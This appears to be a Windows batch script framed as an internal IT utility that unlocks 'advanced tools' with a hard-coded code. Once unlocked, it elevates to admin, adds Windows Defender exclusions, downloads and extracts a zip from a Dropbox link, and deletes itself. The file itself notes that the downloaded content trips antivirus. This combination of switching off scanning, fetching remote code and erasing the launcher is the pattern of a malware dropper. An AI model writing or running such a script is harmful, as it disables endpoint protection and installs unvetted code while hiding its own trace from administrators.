goto :COMMENT_BLOCK
.SYNOPSIS 
This script restricts some more advanced tools that may cause issues in our environment

.DESCRIPTION 
This script restricts some more advanced tools that may cause issues in our environment but are needed for certain tasks, a code is needed to access these tools which can be found by editing this .bat file.
The reason for the code is to prevent unknowledgable users from blindly or accidentally running the scripts contained within the Advanced_Tools folder and requires conscious effort to access

.PARAMETER
No parameters are accepted

.NOTES
Author: 23jrg
Created: 2025
Ticket: General ticket
Risk tier: Low
Targets: Windows 7/10/11 workstations; single computer
Requires: Local Admin
Rollback: The files downloaded will be cleared when the Impeller does
AI-assisted: no

.CHANGELOG
V1.0 2025-07-29 23jrg Complience update
V1.1 2026-08-05 23jrg Bug fix with the exclusions
:COMMENT_BLOCK

@echo off

REM Prompts the user to re-launch this script with higher elevation
FSUTIL DIRTY query %SystemDrive% >NUL || (
    PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
    EXIT
)

:start

REM Checks to see if the entered code is correct, this is not intended to be secure but more to dissuade people from running the WIP stuff that will trip Anti-Virus
echo Enter the code to unlock additional functionality :
set /p "code=>"

if "%code%"=="1337" (

powershell -Command "Add-MpPreference -ExclusionPath c:\23jrg;Add-MpPreference -ExclusionPath c:\24jrg;curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/gtlcfndl5i1qfx57wj7vc/AMVC0KXCiyi9m-h_S2eXAzA?rlkey=4pffij1swvcbmck4vn1xe8fr2&st=tg55mia6&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools\Advanced_tools"
(goto) 2>nul & del "%~f0"

) else (
    echo Access Denied. Try again.
    goto start
)
